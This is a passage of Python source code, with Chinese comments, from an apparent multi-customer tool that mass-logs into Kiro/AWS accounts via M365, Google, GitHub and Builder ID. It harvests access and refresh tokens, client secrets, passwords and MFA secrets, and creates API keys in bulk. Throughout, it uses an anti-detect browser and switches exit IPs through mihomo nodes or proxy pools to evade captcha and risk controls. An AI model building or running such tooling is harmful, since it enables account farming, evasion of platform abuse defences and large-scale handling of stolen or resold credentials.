        mihomo.listen_proxy() if hasattr(mihomo, "listen_proxy") else "",
        (os.environ.get("KIRO_MIHOMO_PROBE_PROXY") or "").strip(),
        DEFAULT_PROXY,
        "http://127.0.0.1:7895",
        "http://127.0.0.1:7890",
    ):
        ok = sanitize_proxy(candidate, allow_loopback=True)
        if ok:
            return ok
    return "http://127.0.0.1:7895"


def apply_mihomo_exit_proxy(accounts: list["AccountInput"], log=None) -> str:
    """Send browser traffic through local mihomo so node switches change the exit IP."""
    if not mihomo.enabled():
        return ""
    proxy = mihomo_listen_proxy()
    n = 0
    for acc in accounts:
        if acc.proxy != proxy:
            acc.proxy = proxy
            n += 1
    if log:
        if n:
            log(f"已改走本机 mihomo 出口 {proxy}（{n} 个账号），撞 captcha 时切节点换 IP")
        else:
            log(f"本机 mihomo 出口 {proxy} 已就绪")
    return proxy


def parse_proxy_pool(text: str) -> list[str]:
    """解析代理池文本（每行一个），返回规范化后的合法代理列表。

    支持：
      http(s)://[user:pass@]host:port
      socks5://...
      裸 host:port
      ip:port:username:password
      username:password:ip:port
    空行/#注释忽略。
    """
    pool: list[str] = []
    for raw in (text or "").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        ok = sanitize_proxy(line)
        if ok and ok not in pool:
            pool.append(ok)
    return pool


def apply_proxy_pool(accounts: list["AccountInput"], pool: list[str]) -> int:
    """把代理池轮流（round-robin）分配给「未单独指定代理」的账号。
    已在账号行里写了代理的不覆盖。返回分配了多少个。"""
    if not pool:
        return 0
    assigned = 0
    i = 0
    for acc in accounts:
        if acc.proxy:
            continue
        acc.proxy = pool[i % len(pool)]
        i += 1
        assigned += 1
    return assigned


def configure_runtime_proxy_pool(job: Job, accounts: list["AccountInput"], options: dict[str, Any], log) -> Any:
    """Prepare a per-active-browser proxy pool and adjust concurrency.

    The returned callable must be invoked when the job exits. When a runtime
    proxy pool exists, the scheduler assigns one proxy to each active browser
    slot and only reuses it after that browser finishes.
    """
    requested = max(1, min(int(options.get("threads") or 1), len(accounts) or 1, MAX_THREADS_PER_JOB))
    options["threads"] = requested
    job.threads = requested
    subscription_url = str(options.get("proxy_subscription_url") or "").strip()
    try:
        subscription_pool_size = int(options.get("proxy_subscription_pool_size") or requested)
    except Exception:
        subscription_pool_size = requested
    subscription_pool_size = max(requested, min(subscription_pool_size, len(accounts) or requested))
    if requested <= 1 and not subscription_url:
        return lambda: None

    direct_pool = [p for p in dict.fromkeys(options.get("proxy_pool") or []) if p]
    if direct_pool:
        usable = direct_pool[:requested]
        if len(usable) < requested:
            requested = len(usable)
            options["threads"] = max(1, requested)
            job.threads = max(1, requested)
            log(f"代理池可用出口只有 {len(usable)} 个，并发自动调整为 {job.threads}")
        if usable:
            options["runtime_proxy_pool"] = usable
            log(f"并发代理池已启用：{len(usable)} 个 HTTP/SOCKS 出口；每个活跃浏览器使用不同代理")
        return lambda: None

    if subscription_url:
        runtime_dir = Path(__file__).parent / "data" / "mihomo_runtime" / job.id
        proxies, cleanup = mihomo.start_subscription_proxy_pool(subscription_pool_size, subscription_url, runtime_dir, log=log)
        if proxies:
            adjusted = min(requested, len(proxies))
            options["runtime_proxy_pool"] = proxies
            options["threads"] = adjusted
            job.threads = adjusted
            log(f"订阅独立出口池已启用：{len(proxies)} 个本地端口，并发 {adjusted}；每个活跃浏览器使用不同订阅节点")
            return cleanup
        log("订阅没有筛出可用节点，继续尝试本机 mihomo 配置")

    explicit_unique = [p for p in dict.fromkeys(acc.proxy for acc in accounts if acc.proxy)]
    if len(explicit_unique) >= requested:
        options["runtime_proxy_pool"] = explicit_unique[:requested]
        log(f"账号行已提供 {len(explicit_unique)} 个不同代理，按运行时代理池并发 {requested} 运行")
        return lambda: None

    if mihomo.enabled():
        runtime_dir = Path(__file__).parent / "data" / "mihomo_runtime" / job.id
        proxies, cleanup = mihomo.start_node_proxy_pool(requested, runtime_dir, log=log)
        if proxies:
            adjusted = min(requested, len(proxies))
            options["runtime_proxy_pool"] = proxies[:adjusted]
            options["threads"] = adjusted
            job.threads = adjusted
            log(f"mihomo 独立出口池已启用：{adjusted} 个本地端口；每个活跃浏览器使用不同节点")
            return cleanup
        log("mihomo 没有探测到足够可用的独立出口，避免共享同一出口，自动降为串行")
    else:
        log("未检测到可用 mihomo 控制器或代理池，避免多个浏览器共享同一出口，自动降为串行")

    options.pop("runtime_proxy_pool", None)
    options["threads"] = 1
    job.threads = 1
    return lambda: None


def runtime_proxy_pool(options: dict[str, Any]) -> list[str]:
    return [str(p) for p in (options.get("runtime_proxy_pool") or []) if p]


def post_json(url: str, body: dict[str, Any], headers: dict[str, str], timeout: float = 30.0) -> tuple[int, dict[str, Any]]:
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode("utf-8"),
        method="POST",
        headers=headers,
    )
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            text = resp.read().decode("utf-8", "replace")
            return resp.status, json.loads(text) if text else {}
    except urllib.error.HTTPError as exc:
        text = exc.read().decode("utf-8", "replace")
        try:
            data = json.loads(text)
        except Exception:
            data = {"_raw": text}
        return exc.code, data
    except urllib.error.URLError as exc:
        # DNS 解析失败 / 连接错误（如选错 Kiro Region 拼出不存在的域名 q.<region>.amazonaws.com）。
        # 不再让异常冒泡炸掉整个任务——返回合成 599 状态，由调用方按 >=400 跳到下一个区域。
        return 599, {"_raw": f"URLError: {exc.reason}"}


def list_profiles_all_regions(access_token: str, preferred_region: str, log, exhaustive: bool = False) -> list[dict[str, str]]:
    regions: list[str] = []
    for region in (preferred_region, *PROFILE_SCAN_REGIONS):
        region = dca.normalize_kiro_region(region)
        if region not in regions:
            regions.append(region)

    profiles_by_arn: dict[str, dict[str, str]] = {}
    machine_id = hashlib.sha256(access_token.encode("utf-8")).hexdigest()
    user_agent = (
        "aws-sdk-js/1.0.0 ua/2.1 os/Linux lang/js md/nodejs#24 "
        f"api/codewhispererruntime#1.0.0 m/N,E KiroIDE-{KIRO_PROFILE_API_VERSION}-{machine_id}"
    )
    amz_user_agent = f"aws-sdk-js/1.0.0 KiroIDE-{KIRO_PROFILE_API_VERSION}-{machine_id}"
    for region in regions:
        host = f"q.{region}.amazonaws.com"
        next_token = None
        while True:
            body: dict[str, Any] = {"maxResults": 10}
            if next_token:
                body["nextToken"] = next_token
            status, data = post_json(
                dca.kiro_q_url(region),
                body,
                {
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/x-amz-json-1.0",
                    "x-amz-target": dca.CW_LIST_PROFILES_TARGET,
                    "x-amz-user-agent": amz_user_agent,
                    "User-Agent": user_agent,
                    "Host": host,
                    "amz-sdk-invocation-id": str(uuid.uuid4()),
                    "amz-sdk-request": "attempt=1; max=1",
                    "Connection": "close",
                },
            )
            if status >= 400:
                log(f"ListAvailableProfiles {region} HTTP {status}: {str(data)[:160]}")
                break
            for item in data.get("profiles") or []:
                arn = (item.get("arn") or item.get("profileArn") or "").strip()
                if not arn:
                    continue
                profiles_by_arn[arn] = {
                    "arn": arn,
                    "profileName": item.get("profileName") or item.get("name") or "",
                    "region": dca.region_from_profile_arn(arn) or region,
                }
            next_token = data.get("nextToken")
            if not next_token:
                break
        if profiles_by_arn and not exhaustive:
            break
    return list(profiles_by_arn.values())


def expires_at_ms(expires_at_iso: str) -> int:
    try:
        value = expires_at_iso.replace("Z", "+00:00")
        return int(dt.datetime.fromisoformat(value).timestamp() * 1000)
    except Exception:
        return int(time.time() * 1000)


def machine_id_for(email: str, profile_arn: str) -> str:
    return hashlib.sha256(f"{email}|{profile_arn}".encode("utf-8")).hexdigest()


def flatten_export(
    exp: dca.DurableExport,
    email: str,
    profile: dict[str, str],
    priority: int,
    password: str = "",
    mfa_secret: str = "",
    auth_method: str = "IdC",
    provider: str = "Enterprise",
    idp: str = "Enterprise",
) -> dict[str, Any]:
    arn = profile["arn"]
    auth_region = exp.oidc_region or dca.DEFAULT_OIDC_REGION
    api_region = profile.get("region") or dca.region_from_profile_arn(arn) or exp.region
    return {
        "email": email,
        "username": email,
        "account": email,
        "password": password,
        "mfaSecret": mfa_secret,
        "idp": idp,
        "profileArn": arn,
        "machineId": machine_id_for(email, arn),
        "priority": priority,
        "status": "active",
        "accessToken": exp.access_token,
        "refreshToken": exp.refresh_token,
        "clientId": exp.client_id,
        "clientSecret": exp.client_secret,
        "authMethod": auth_method,
        "provider": provider,
        "region": auth_region,
        "authRegion": auth_region,
        "apiRegion": api_region,
        "startUrl": exp.start_url,
        "expiresAt": expires_at_ms(exp.expires_at),
    }


def flatten_export_m365(
    result: "m365.M365LoginResult",
    email: str,
    profile: dict[str, str],
    priority: int,
    password: str = "",
    mfa_secret: str = "",
) -> dict[str, Any]:
    """将 M365 / 外部 IdP 登录结果展平为与 IdC 路径一致的导出结构。

    外部 IdP 是 public client + PKCE，**没有 clientSecret**；刷新依赖
    token_endpoint + issuer_url + scopes，所以额外携带这些字段。
    """
    arn = profile["arn"]
    api_region = profile.get("region") or m365.region_from_profile_arn(arn) or result.region
    return {
        "email": email,
        "username": email,
        "account": email,
        "password": password,
        "mfaSecret": mfa_secret,
        "idp": "Enterprise",
        "profileArn": arn,
        "machineId": machine_id_for(email, arn),
        "priority": priority,
        "status": "active",
        "accessToken": result.access_token,
        "refreshToken": result.refresh_token,
        "clientId": result.client_id,
        "clientSecret": "",
        "authMethod": "external_idp",
        "provider": "Enterprise",
        "region": result.region,
        "authRegion": result.region,
        "apiRegion": api_region,
        "startUrl": "",
        "issuerUrl": result.issuer_url,
        "tokenEndpoint": result.token_endpoint,
        "scopes": result.scopes,
        "expiresAt": expires_at_ms(time.time() + result.expires_in) if result.expires_in else 0,
    }


def expires_at_from_expires_in(expires_in: int) -> int:
    try:
        return int((time.time() + int(expires_in or 0)) * 1000) if expires_in else 0
    except Exception:
        return 0


def social_provider_label(provider: str) -> str:
    provider = (provider or "").strip().lower()
    if provider == "github":
        return "GitHub"
    if provider == "google":
        return "Google"
    return provider or "social"


def flatten_export_social(
    result: "m365.M365LoginResult",
    email: str,
    profile: dict[str, str],
    priority: int,
    password: str = "",
    mfa_secret: str = "",
    provider: str = "google",
) -> dict[str, Any]:
    """Personal Google/GitHub credentials in the same flat export shape.

    Kiro personal social login exposes app cookie tokens and does not carry the
    IDC clientSecret. Keep the field present but empty for compatibility with
    consumers that expect a stable key set.
    """
    arn = profile["arn"]
    api_region = profile.get("region") or m365.region_from_profile_arn(arn) or result.region
    provider_label = social_provider_label(provider)
    return {
        "email": email,
        "username": email,
        "account": email,
        "password": password,
        "mfaSecret": mfa_secret,
        "idp": "Personal",
        "profileArn": arn,
        "machineId": machine_id_for(email, arn),
        "priority": priority,
        "status": "active",
        "accessToken": result.access_token,
        "refreshToken": result.refresh_token,
        "clientId": result.client_id or "",
        "clientSecret": "",
        "authMethod": "social",
        "provider": provider_label,
        "loginMethod": provider.lower(),
        "region": result.region,
        "authRegion": result.region,
        "apiRegion": api_region,
        "startUrl": "",
        "expiresAt": expires_at_from_expires_in(result.expires_in),
    }


def describe_kiro_profile_error(status: int, data: dict[str, Any]) -> str:
    message = str(data.get("message") or data.get("Message") or data.get("_raw") or data)
    reason = str(data.get("reason") or data.get("Reason") or "")
    if status == 403 and ("TEMPORARILY_SUSPENDED" in reason or "temporarily suspended" in message.lower()):
        return "Kiro 账号已被 AWS 临时暂停：检测到异常活动，需要联系 AWS/Kiro 支持恢复"
    if status == 403:
        return f"Kiro 上游拒绝访问（403）：{message[:160]}"
    return f"Kiro profile 检查失败（HTTP {status}）：{message[:160]}"


def check_profile_available(exp: dca.DurableExport, profile: dict[str, str], strict_call_probe: bool = False) -> str:
    arn = profile["arn"]
    region = profile.get("region") or dca.region_from_profile_arn(arn) or exp.region
    status, data = dca.get_profile(exp.access_token, arn, region)
    if status >= 400:
        return describe_kiro_profile_error(status, data)
    if strict_call_probe:
        status, data = dca.probe_generate_assistant(exp.access_token, arn, region)
        if status >= 400:
            return describe_kiro_profile_error(status, data)
        if status == 0:
            message = str(data.get("_raw") or data)
            return f"Kiro 调用可用性检查失败：{message[:160]}"
    return ""


def create_api_key_export(exp: dca.DurableExport, email: str, profile: dict[str, str], label: str, log, token_type: Optional[str] = None) -> str:
    arn = profile["arn"]
    region = profile.get("region") or dca.region_from_profile_arn(arn) or exp.region
    status, profile_data = dca.get_profile(exp.access_token, arn, region, token_type=token_type)
    if status >= 400:
        raise RuntimeError(f"GetProfile HTTP {status}: {str(profile_data)[:200]}")
    if not dca.api_keys_enabled(profile_data):
        raise RuntimeError("该 profile 未开启 API Keys 功能，请先在 Kiro 门户开启")
    status, created = dca.create_api_key(exp.access_token, arn, region, label, token_type=token_type)
    if status >= 400 or not created.get("rawKey"):
        raise RuntimeError(f"CreateApiKey HTTP {status}: {str(created)[:200]}")
    raw_key = created.get("rawKey") or ""
    log(f"API Key 创建成功：{created.get('keyPrefix') or raw_key[:12]}...")
    return raw_key


def normalize_json_credential(item: dict[str, Any]) -> dict[str, str]:
    def pick(*names: str) -> str:
        for name in names:
            value = item.get(name)
            if value:
                return str(value).strip()
        return ""
    profile_arn = pick("profileArn", "profile_arn")
    api_region = pick("apiRegion", "api_region") or dca.region_from_profile_arn(profile_arn) or pick("region")
    oidc_region = pick("authRegion", "auth_region", "oidcRegion", "oidc_region") or pick("region") or dca.DEFAULT_OIDC_REGION
    return {
        "email": pick("email", "id"),
        "refresh_token": pick("refreshToken", "refresh_token"),
        "client_id": pick("clientId", "client_id"),
        "client_secret": pick("clientSecret", "client_secret"),
        "profile_arn": profile_arn,
        "oidc_region": oidc_region,
        "api_region": api_region,
    }


def load_json_credentials_from_zip(file_storage) -> list[dict[str, str]]:
    raw = file_storage.read()
    if not raw:
        raise ValueError("ZIP 文件为空")
    if len(raw) > 10 * 1024 * 1024:
        raise ValueError("ZIP 文件不能超过 10MB")
    rows: list[dict[str, str]] = []
    with zipfile.ZipFile(io.BytesIO(raw)) as zf:
        infos = [info for info in zf.infolist() if not info.is_dir() and info.filename.lower().endswith(".json")]
        if len(infos) > MAX_ACCOUNTS_PER_JOB:
            raise ValueError(f"单次最多处理 {MAX_ACCOUNTS_PER_JOB} 个 JSON")
        for info in infos:
            if info.file_size > 256 * 1024:
                raise ValueError(f"JSON 文件过大：{info.filename}")
            data = json.loads(zf.read(info).decode("utf-8"))
            items = data if isinstance(data, list) else [data]
            for item in items:
                if not isinstance(item, dict):
                    continue
                row = normalize_json_credential(item)
                missing = [k for k in ("refresh_token", "client_id", "client_secret", "profile_arn") if not row.get(k)]
                if missing:
                    raise ValueError(f"{info.filename} 缺少字段：{', '.join(missing)}")
                rows.append(row)
    if not rows:
        raise ValueError("ZIP 内没有可用 JSON 凭据")
    if len(rows) > MAX_ACCOUNTS_PER_JOB:
        raise ValueError(f"单次最多处理 {MAX_ACCOUNTS_PER_JOB} 条凭据")
    return rows


def run_json_api_key_one(job: Job, row: dict[str, str], label: str) -> AccountResult:
    email = row.get("email") or row.get("profile_arn", "")[-18:]
    status, token_data = dca.refresh_access_token(
        row["refresh_token"],
        row["client_id"],
        row["client_secret"],
        row.get("oidc_region") or dca.DEFAULT_OIDC_REGION,
    )
    if status >= 400 or not token_data.get("accessToken"):
        return AccountResult(int(row.get("idx", 0)), email, False, f"刷新 token 失败：HTTP {status}")
    access_token = token_data["accessToken"]
    profile_arn = row["profile_arn"]
    api_region = row.get("api_region") or dca.region_from_profile_arn(profile_arn) or dca.DEFAULT_KIRO_REGION
    status, profile_data = dca.get_profile(access_token, profile_arn, api_region)
    if status >= 400:
        return AccountResult(int(row.get("idx", 0)), email, False, describe_kiro_profile_error(status, profile_data))
    if not dca.api_keys_enabled(profile_data):
        return AccountResult(int(row.get("idx", 0)), email, False, "该 profile 未开启 API Keys")
    status, created = dca.create_api_key(access_token, profile_arn, api_region, label)
    raw_key = created.get("rawKey") if isinstance(created, dict) else ""
    if status >= 400 or not raw_key:
        return AccountResult(int(row.get("idx", 0)), email, False, f"CreateApiKey 失败：HTTP {status}")
    return AccountResult(int(row.get("idx", 0)), email, True, "API Key 创建成功", api_keys=[raw_key])


def run_json_api_key_job(job: Job, rows: list[dict[str, str]], options: dict[str, Any]) -> None:
    job.status = "running"
    label = options.get("api_key_label") or "1"
    threads = max(1, min(int(options.get("threads") or 3), MAX_THREADS_PER_JOB, len(rows)))
    job.threads = threads
    out_dir = Path(__file__).parent / "exports" / job.customer_id
    out_dir.mkdir(parents=True, exist_ok=True)
    out_dir.chmod(0o700)
    job.log_path = str(out_dir / f"kiro-job-log-{job.id}.txt")
    Path(job.log_path).touch(mode=0o600, exist_ok=True)
    job.api_keys_path = str(out_dir / f"kiro-api-keys-{job.id}.txt")
    api_keys_file = Path(job.api_keys_path)
    api_keys_file.touch(mode=0o600, exist_ok=True)
    api_keys_file.chmod(0o600)
    job.log(f"开始 JSON 开通 API Key：凭据 {len(rows)} 条，并发 {threads}")
    api_keys_all: list[str] = []
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, row in enumerate(rows, start=1):
                row = dict(row)
                row["idx"] = str(idx)
                futures.append(executor.submit(run_json_api_key_one, job, row, label))
            for future in as_completed(futures):
                result = future.result()
                with JOBS_LOCK:
                    job.results.append(result)
                    job.done += 1
                    if result.ok:
                        job.ok += 1
                        api_keys_all.extend(result.api_keys)
                        for api_key in result.api_keys:
                            with api_keys_file.open("a", encoding="utf-8") as fh:
                                fh.write(api_key + "\n")
                    else:
                        job.failed += 1
                    save_job_history()
                job.log(f"进度 {job.done}/{job.total}：{result.email} - {result.message}")
        job.status = "finished" if job.failed == 0 else "failed"
        job.log(f"完成：成功 {job.ok}，失败 {job.failed}，API Key {len(api_keys_all)} 条")
        audit("json_apikey_job.finished", jobId=job.id, customerId=job.customer_id, ok=job.ok, failed=job.failed, apiKeys=len(api_keys_all), apiKeysPath=job.api_keys_path or None)
    except Exception as exc:
        job.status = "failed"
        job.log(f"任务失败：{exc}")
        audit("json_apikey_job.failed", jobId=job.id, customerId=job.customer_id, error=str(exc))
    finally:
        job.finished_at = time.time()
        save_job_history()
        SCHEDULER_WAKE.set()


def run_one_m365(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    """M365 / 外部 IdP（Entra ID）SSO 单账号登录。

    流程：app.kiro.dev/signin → Your organization → 填邮箱 → M365 密码[+MFA]
    → 回环回调 → 换 token → ListAvailableProfiles。不涉及改密/start_url。
    """
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    # 效率优先：不做启动错峰等待；若触发风控/验证码，失败后立即换 IP 重试。
    debug_dir = Path(__file__).parent / "debug_mfa" / job.id / f"{acc.idx:03d}"
    try:
        port = acquire_m365_port()
    except RuntimeError as exc:
        return AccountResult(acc.idx, acc.email, False, str(exc))

    log("开始 M365 SSO 登录")
    sess = m365.M365LoginSession(port=port, proxy_url=acc.proxy or None,
                                 region=options["kiro_region"], log=log)
    try:
        signin_url = sess.start()
    except RuntimeError as exc:
        release_m365_port(port)
        return AccountResult(acc.idx, acc.email, False, f"启动回环监听失败：{exc}")

    drv: dict[str, Any] = {}
    driver_done = threading.Event()

    def drive() -> None:
        try:
            ok, err = m365b.drive_m365_login(
                signin_url, acc.email, acc.password,
                mfa_secret=acc.mfa_secret, log=log, headless=options["headless"],
                proxy=acc.proxy, timeout_s=options["login_timeout"],
                failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
                stop_event=job.stop_event, debug_dir=str(debug_dir),
            )
            drv["ok"] = ok
            drv["err"] = err
        except Exception as exc:
            drv["ok"] = False
            drv["err"] = f"浏览器登录线程异常：{exc}"
        finally:
            driver_done.set()

    th = threading.Thread(target=drive, daemon=True)
    th.start()
    try:
        deadline = time.time() + options["login_timeout"] + 10
        driver_failed_at = 0.0
        failure_wait = int(options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS) or DEFAULT_FAILURE_WAIT_SECONDS)
        result = None
        while time.time() < deadline:
            step = min(1.0, max(0.1, deadline - time.time()))
            candidate = sess.wait_and_exchange(timeout=step, stop_event=job.stop_event)
            if candidate.ok or not candidate.error.startswith("SSO 登录超时"):
                result = candidate
                break
            if driver_done.is_set() and not drv.get("ok"):
                if not driver_failed_at:
                    driver_failed_at = time.time()
                if time.time() - driver_failed_at >= failure_wait:
                    msg = drv.get("err") or candidate.error
                    result = m365.M365LoginResult(False, error=msg)
                    break
        if result is None:
            result = m365.M365LoginResult(False, error="SSO 登录超时（%ds 内未完成）" % (options["login_timeout"] + 10))
    finally:
        sess.close()
        th.join(timeout=10)
        release_m365_port(port)

    if not result.ok:
        drv_err = drv.get("err") or ""
        # 浏览器側错误更贴近根因（密码错/MFA），优先报它
        msg = drv_err or result.error
        log(f"登录失败：{msg}")
        return AccountResult(acc.idx, acc.email, False, msg)

    log(f"登录成功，profile={result.profile_arn.split('/')[-1] if result.profile_arn else '?'}")
    profiles = result.profiles or ([{"arn": result.profile_arn, "region": result.region}] if result.profile_arn else [])
    if not profiles:
        return AccountResult(acc.idx, acc.email, False, "登录成功但未获取到 profileArn")

    exported: list[dict[str, Any]] = []
    for profile in profiles:
        exported.append(flatten_export_m365(result, acc.email, profile, 0, acc.password, acc.mfa_secret))

    # API Key 开通：M365/外部 IdP token 调管理面（GetProfile/CreateApiKey）
    # 必须携 tokentype=EXTERNAL_IDP，否则返回 400 "Invalid token"。
    api_keys: list[str] = []
    if options.get("create_api_keys") or options.get("api_key_only"):
        api_label = options.get("api_key_label") or "1"
        for profile in profiles:
            try:
                api_keys.append(create_api_key_export(
                    result, acc.email, profile, api_label, log, token_type="EXTERNAL_IDP"))
            except Exception as exc:
                log(f"API Key 创建失败：{exc}")
                return AccountResult(
                    acc.idx, acc.email, False,
                    f"登录成功但 API Key 创建失败：{exc}",
                    False, exported, api_keys, acc.mfa_secret,
                )
    suffix = f"，apiKeys={len(api_keys)}" if (options.get("create_api_keys") or options.get("api_key_only")) else ""
    log(f"账号处理完成：profile {len(exported)} 个{suffix}")
    return AccountResult(acc.idx, acc.email, True, f"完成：profile {len(exported)} 个{suffix}", False, exported, api_keys, acc.mfa_secret)


def switch_exit_ip(
    acc: AccountInput,
    options: dict[str, Any],
    log,
    reason: str,
    attempt: int,
    max_attempts: int,
    pool_i: list[int],
) -> bool:
    """Rotate mihomo node or proxy-pool entry. pool_i is a 1-element cursor."""
    if options.get("runtime_proxy_pool"):
        log(f"{reason}，当前任务使用并发独立出口池；为避免影响其它活跃浏览器，本账号不在运行中切换出口")
        return False
    _pool = [p for p in (options.get("proxy_pool") or []) if p]
    if mihomo.enabled():
        acc.proxy = mihomo_listen_proxy()
        log(f"{reason}，立即换出口 IP 重试（第 {attempt}/{max_attempts} 次）")
        mihomo.pick_and_switch(exclude=mihomo.current_node(), log=log)
        if is_captcha_error(reason):
            cd = random.uniform(3.0, 7.0)
            slept = 0.0
            while slept < cd:
                time.sleep(min(1.0, cd - slept))
                slept += 1.0
        return True
    if _pool:
        picked = ""
        for _ in range(len(_pool)):
            cand = _pool[pool_i[0] % len(_pool)]
            pool_i[0] += 1
            if cand != acc.proxy:
                picked = cand
                break
        if picked:
            acc.proxy = picked
            host = picked.split("://", 1)[-1].split("@")[-1].split("/", 1)[0]
            log(f"{reason}，已轮换代理池下一个代理→ {host}（第 {attempt}/{max_attempts} 次）")
            if is_captcha_error(reason):
                cd = random.uniform(3.0, 7.0)
                slept = 0.0
                while slept < cd:
                    time.sleep(min(1.0, cd - slept))
                    slept += 1.0
            return True
        log(f"{reason}，代理池无其他可用代理可换，停止重试（第 {attempt}/{max_attempts} 次）")
        return False
    log(f"{reason}，未配置换 IP 能力（无 mihomo 控制器且未提交代理池），无法解 captcha，停止重试")
    return False


def camoufox_profile_dir(job: Job, acc: AccountInput, provider: str) -> str:
    safe_email = re.sub(r"[^A-Za-z0-9_.-]+", "_", (acc.email or "account")).strip("._-")
    if not safe_email:
        safe_email = "account"
    safe_provider = re.sub(r"[^A-Za-z0-9_.-]+", "_", (provider or "browser")).strip("._-") or "browser"
    return str(
        Path(__file__).parent
        / "data"
        / "camoufox_profiles"
        / job.customer_id
        / job.id
        / safe_provider
        / f"{acc.idx:03d}_{safe_email[:80]}"
    )


def run_one_social(job: Job, acc: AccountInput, options: dict[str, Any], provider: str) -> AccountResult:
    """Personal Google/GitHub login through Kiro portal cookies."""
    provider = (provider or "google").lower()
    provider_label = social_provider_label(provider)
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    debug_dir = Path(__file__).parent / "debug_social" / job.id / provider / f"{acc.idx:03d}"
    profile_dir = camoufox_profile_dir(job, acc, provider)
    log(f"开始 {provider_label} 个人号登录")
    log(f"使用 Camoufox 独立 profile：{Path(profile_dir).name}")

    def _drive() -> tuple[bool, str, dict[str, Any]]:
        kwargs = dict(
            email=acc.email, password=acc.password,
            mfa_secret=acc.mfa_secret, log=log, headless=options["headless"],
            proxy=acc.proxy, timeout_s=options["login_timeout"],
            failure_wait_s=options.get("failure_wait", DEFAULT_FAILURE_WAIT_SECONDS),
            stop_event=job.stop_event, debug_dir=str(debug_dir),
            profile_dir=profile_dir,
        )
        if provider == "github":
            return githubb.drive_github_login(**kwargs)
        return googleb.drive_google_login(**kwargs)

    ok, err, tokens = False, "", {}
    rc_max = int(options.get("risk_retry", 3) if options.get("risk_retry") is not None else 3)
    rc_attempt = 0
    pool_i = [0]
    while True:
        if job.stop_event.is_set():
            return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")
        try:
            ok, err, tokens = _drive()
        except Exception as exc:
            ok, err, tokens = False, f"浏览器登录线程异常：{exc}", {}
        if ok:
            break
        retryable = is_captcha_error(err) or is_proxy_conn_error(err)
        if (not retryable) or rc_attempt >= rc_max:
            log(f"登录失败：{err}")
            return AccountResult(acc.idx, acc.email, False, err)
        rc_attempt += 1
        reason = "验证码/风控" if is_captcha_error(err) else "代理连接异常"
        if not switch_exit_ip(acc, options, log, reason, rc_attempt, rc_max, pool_i):
            log(f"登录失败：{err}")
            return AccountResult(acc.idx, acc.email, False, err)
    if not tokens.get("refreshToken"):
        return AccountResult(acc.idx, acc.email, False, "登录成功但未找到 RefreshToken")
    if not tokens.get("accessToken"):
        return AccountResult(acc.idx, acc.email, False, "登录成功但未找到 AccessToken")

    result = m365.M365LoginResult(
        True,
        auth_method="social",
        access_token=str(tokens.get("accessToken") or ""),
        refresh_token=str(tokens.get("refreshToken") or ""),
        expires_in=int(tokens.get("expiresIn") or 3600),
        region=options["kiro_region"],
    )

    profiles: list[dict[str, str]] = []
    try:
        profiles = m365.list_available_profiles(result.access_token, result.region, False, acc.proxy or None)
    except Exception as exc:
        profile_error = str(exc)
        if "temporarily suspended" in profile_error.lower() or "temporarily is suspended" in profile_error.lower() or "locked your account" in profile_error.lower():
            log(f"Kiro 账号已被临时暂停：{profile_error[:220]}")
            return AccountResult(acc.idx, acc.email, False, f"Kiro 账号已被临时暂停：{profile_error[:180]}", final_password=acc.password)
        log(f"扫描 social profile 失败，使用默认个人号 profileArn 兜底：{profile_error}")
    if profiles:
        result.profiles = profiles
        result.profile_arn = profiles[0]["arn"]
    else:
        result.profile_arn = KIRO_SOCIAL_PROFILE_ARN
        profiles = [{"arn": KIRO_SOCIAL_PROFILE_ARN, "region": "us-east-1"}]
    arn_region = m365.region_from_profile_arn(result.profile_arn)
    if arn_region:
        result.region = arn_region

    log(f"登录成功，profile={result.profile_arn.split('/')[-1] if result.profile_arn else '?'}")
    if not profiles:
        return AccountResult(acc.idx, acc.email, False, "登录成功但未获取到 profileArn")

    exported: list[dict[str, Any]] = []
    for profile in profiles:
        exported.append(flatten_export_social(result, acc.email, profile, 0, acc.password, acc.mfa_secret, provider))

    api_keys: list[str] = []
    if options.get("create_api_keys") or options.get("api_key_only"):
        api_label = options.get("api_key_label") or "1"
        for profile in profiles:
            try:
                api_keys.append(create_api_key_export(result, acc.email, profile, api_label, log))
            except Exception as exc:
                log(f"API Key 创建失败：{exc}")
                return AccountResult(
                    acc.idx, acc.email, False,
                    f"登录成功但 API Key 创建失败：{exc}",
                    False, exported, api_keys, acc.mfa_secret,
                    final_password=acc.password,
                )
    suffix = f"，apiKeys={len(api_keys)}" if (options.get("create_api_keys") or options.get("api_key_only")) else ""
    suffix += "，未改密（沿用原密码）"
    log(f"账号处理完成：profile {len(exported)} 个{suffix}")
    return AccountResult(
        acc.idx, acc.email, True,
        f"完成：profile {len(exported)} 个{suffix}",
        False, exported, api_keys, acc.mfa_secret,
        final_password=acc.password,
    )


def run_one_student(job: Job, acc: AccountInput, options: dict[str, Any]) -> AccountResult:
    """Kiro 学生号：AWS Builder ID 设备码 + MFA/Outlook 验证码。"""
    prefix = f"#{acc.idx} {acc.email}"

    def log(message: str) -> None:
        job.log(f"{prefix}: {message}")

    if job.stop_event.is_set():
        return AccountResult(acc.idx, acc.email, False, "已中断（任务被手动停止，未执行）")

    debug_dir = Path(__file__).parent / "debug_mfa" / job.id / f"{acc.idx:03d}"
    profile_dir = camoufox_profile_dir(job, acc, "builder_id")
    mail_password = acc.outlook_password()
    mfa_secret = (acc.mfa_secret or "").strip()
    if not mail_password and not mfa_secret:
        return AccountResult(acc.idx, acc.email, False, "学生号需要 Outlook 邮箱密码（PASS MAIL）或已有 2FA 密钥")

    log("开始学生号登录（AWS Builder ID）")
    log(f"使用 Camoufox 独立 profile：{Path(profile_dir).name}")
    if mfa_secret:
